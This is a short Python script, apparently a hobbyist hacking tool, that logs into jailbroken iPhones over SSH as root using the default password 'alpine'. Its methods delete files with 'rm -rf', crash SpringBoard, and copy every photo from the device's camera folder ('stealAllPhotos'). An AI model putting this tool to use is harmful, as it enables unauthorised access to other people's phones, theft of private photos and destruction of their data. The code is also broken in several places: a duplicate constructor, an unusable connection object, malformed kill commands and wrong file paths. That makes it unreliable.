import os.path
import time
import paramiko

class iPhone:
    def __init__(self, ipAdress):
        client = paramiko.SSHClient()
        self.remote_dir = '/private/var/mobile/Media/DCIM'
        self.connection = client.connect(ipAdress, username="root", password="alpine", timeout=5)
        self.name = ""
        self.ip = ipAdress
        self.model = self.connection.exec_command('uname -a')
    def __init__(self, ipAdress, passw):
        client = paramiko.SSHClient()
        self.remote_dir = '/private/var/mobile/Media/DCIM'
        self.connection = client.connect(ipAdress, username="root", password=passw, timeout=5)
        self.name = ""
        self.ip = ipAdress
        self.model = self.connection.exec_command('uname -a')

    def deleteAllFiles(self):
        if input("Do You Really Want To Do This?? (Y/N)") == "Y":
            self.connection.exec_command('rm -rf ')
        else:
            print("Thank God")
            return
    def restartiPhone(self):
        self.connection.exec_command(" killall - HUP SpringBoard")
    def restartSpringBoard(self):
        self.connection.exec_command(" killall - SEGV SpringBoard")
    def stealAllPhotos(self):
        print("Don't be a creep.")
        boof = self.connection.get_transport()
        boof.default_window_size = paramiko.common.MAX_WINDOW_SIZE
        ftp = self.connection.open_sftp()
        current_directory = os.getcwd()
        os.path.join(current_directory, 'Pics')
        newDir = os.path.join(current_directory, '/Pics')
        for directory in ftp.listdir(self.remote_dir):
            newDir = self.remote_dir + '/' + directory
            print(newDir)
            for filename in ftp.listdir(newDir):
                if filename.endswith('.JPG'):
                    print(filename)
                    local_path = os.path.join(newDir, filename)
                    remote_path = newDir + '/' + filename
                    ftp.get(remote_path, local_path)
                    time.sleep(0.01)
    def playSong(self):
        print("coming Soon")
    def installTweak(self):
        print("coming Soon")
